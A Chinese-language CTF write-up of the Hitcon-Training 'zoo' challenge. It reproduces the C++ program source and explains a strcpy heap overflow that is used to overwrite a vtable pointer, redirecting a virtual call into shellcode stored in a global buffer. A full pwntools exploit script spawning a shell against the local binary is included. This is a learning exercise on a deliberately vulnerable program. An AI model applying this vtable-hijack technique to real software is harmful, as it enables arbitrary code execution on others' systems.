---
title: zoo
categories:
- Hitcon-Training
---
# zoo

## 前言

刷到最后还是没能做出最后一题，第一次做C++的题，感觉自己太菜了，代码都读不懂，继续努力吧X

## 程序逻辑

IDA的逆向代码就不贴了，直接看下源代码，父类是Animal，其成员变量为name[24]和weight，此外还有两个虚函数，speak()和info()。Dog和Cat继承了Animal,各自实现了自己的speak和info

```cpp
char nameofzoo[100];

class Animal {
	public :
		Animal(){
			memset(name,0,24);
			weight = 0;
		}
		virtual void speak(){;}
		virtual void info(){;}
	protected :
		char name[24];
		int weight;
};

class Dog : public Animal{
	public :
		Dog(string str,int w){
			strcpy(name,str.c_str());	
			weight = w ;
		}
		virtual void speak(){
			cout << "Wow ~ Wow ~ Wow ~" << endl ;
		}
		virtual void info(){
			cout << "|---------------------|" << endl ;
			cout << "| Animal info         |" << endl;
			cout << "|---------------------|" << endl;
			cout << "  Weight :" << this->weight << endl ;
			cout << "  Name : " << this->name << endl ;
			cout << "|---------------------|" << endl;
		}
};

class Cat : public Animal{
	public :
		Cat(string str,int w){
			strcpy(name,str.c_str());
			weight = w ;
		}
		virtual void speak(){
			cout << "Meow ~ Meow ~ Meow ~" << endl ;			
		}
		virtual void info(){
			cout << "|---------------------|" << endl ;
			cout << "| Animal info         |" << endl;
			cout << "|---------------------|" << endl;
			cout << "  Weight :" << this->weight << endl ;
			cout << "  Name : " << this->name << endl ;
			cout << "|---------------------|" << endl;
		}

};

vector<Animal *> animallist ;
```

adddog()函数首先分配一个Dog()，之后读取Name，但是没有限制长度，导致构造函数里的strcpy溢出name，Cat同理，他们的地址存放在animallist里

```cpp
void adddog(){
	string name ;
	int weight ;
	cout << "Name : " ;
	cin >> name;
	cout << "Weight : " ;
	cin >> weight ;
	Dog *mydog = new Dog(name,weight);
	animallist.push_back(mydog);

}
```

remove()函数delete相应对象并把list清空

```cpp
void remove(){
	unsigned int idx ;
	if(animallist.size() == 0){
		cout << "no any animal!" << endl ;
		return ;
	}
	cout << "index of animal : ";
	cin >> idx ;
	if(idx >= animallist.size()){
		cout << "out of bound !" << endl;
		return ;
	}
	delete animallist[idx];
	animallist.erase(animallist.begin()+idx);


}
```

showinfo()函数调用对象里的虚函数info()

```cpp
void showinfo(){
	unsigned int idx ;
	if(animallist.size() == 0){
		cout << "no any animal!" << endl ;
		return ;
	}
	cout << "index of animal : ";
	cin >> idx ;
	if(idx >= animallist.size()){
		cout << "out of bound !" << endl;
		return ;
	}
	animallist[idx]->info();

}
```

listn()函数调用对象里的虚函数speak()

```cpp
void listen(){
	unsigned int idx ;
	if(animallist.size() == 0){
		cout << "no any animal!" << endl ;
		return ;
	}
	cout << "index of animal : ";
	cin >> idx ;
	if(idx >= animallist.size()){
		cout << "out of bound !" << endl;
		return ;
	}
	animallist[idx]->speak();

}
```

main函数先让用户输入数据到bss段上，之后选择功能执行

```cpp
int main(void){
	unsigned int choice ;
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	cout << "Name of Your zoo :" ;
	read(0,nameofzoo,100);
	while(1){
		menu();
		cout << "Your choice :";
		cin >> choice ;
		cout << endl ;
		switch(choice){
			case 1 :
				adddog();
				break ;
			case 2 :
				addcat();
				break ;
			case 3 :
				listen();
				break ;
			case 4 : 
				showinfo();
				break ;
			case 5 :
				remove();
				break ;
			case 6 :
				_exit(0);
			default :
				cout << "Invaild choice" << endl;
				break ;
		}
	}	
	return 0 ;
}
```

## 漏洞分析

按照刚才函数的分析，adddog和addcat里存在堆溢出，c++的虚函数调用机制是每一个new的类里的fd都执行vtable，而vatable[i]是将要调用函数的函数地址，以speak为例，这里的vtable为0x403140，其内容为speak和info的实际地址。

![vtable](./1.jpg)

![vtable2](./2.jpg)

我们可以先new2个chunk，利用堆溢出覆盖第二个chunk的fd为nameofzoo+len(shellcode)的地址，nameofzoo的数据为shellcode+nameofzoo_addr.当我们调用listen(0)的时候，实际上调用的是chunk2->nameofzoo_addr+len(shellcode)(因为push的缘故)，在这里函数又找到了nameofzoo_addr作为自己的函数实际执行地址，执行speak实际执行了shellocde，这个过程可以借用一张图来说明

![chunk](./3.jpg)

![shellcode](./4.png)

## exp.py

```py
#coding=utf-8
from time import sleep
from pwn import *
debug = 1
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
p = process('./zoo')
#elf = ELF('./magicheap')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
if debug:
    gdb.attach(p)

def AddDog(name,weight):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Name : ')
    p.send(name)
    p.recvuntil('Weight : ')
    p.send(weight)

def Listen(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('index of animal : ')
    p.sendline(str(index))

def Remove(index):
    p.recvuntil('Your choice :')
    p.sendline('5')
    p.recvuntil('index of animal : ')
    p.sendline(str(index))

def Exit():
    p.recvuntil('Your choice :')
    p.sendline('6')


def exp():
    vtable_addr = 0x403140
    nameofzoo_addr = 0x605420
    p.recvuntil('Name of Your zoo :')
    shellcode = asm(shellcraft.sh())
    p.sendline(shellcode+p64(nameofzoo_addr))
    AddDog('1'*7+'\n','0\n')
    AddDog('2'*7+'\n','1\n')
    Remove(0)
    AddDog('3'*0x48+p64(nameofzoo_addr+len(shellcode))+'\n','2\n')
    Listen(0)
    p.interactive()

exp()

```

## 参考

[先知](https://xz.aliyun.com/t/3902#toc-20)
[c++虚表机制](http://showlinkroom.me/2017/08/21/C-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/)
